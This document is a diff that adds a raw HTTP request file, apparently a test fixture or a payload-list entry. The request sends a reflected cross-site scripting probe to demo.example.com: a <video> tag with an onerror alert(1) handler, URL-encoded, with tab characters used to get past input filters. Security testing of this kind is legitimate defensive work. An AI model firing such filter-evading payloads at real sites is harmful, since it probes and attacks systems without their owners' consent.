@@ -1,0 +1,4 @@
+GET /a?cmd=<video%09src%3Dx%09onerror%3Dalert(1)> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
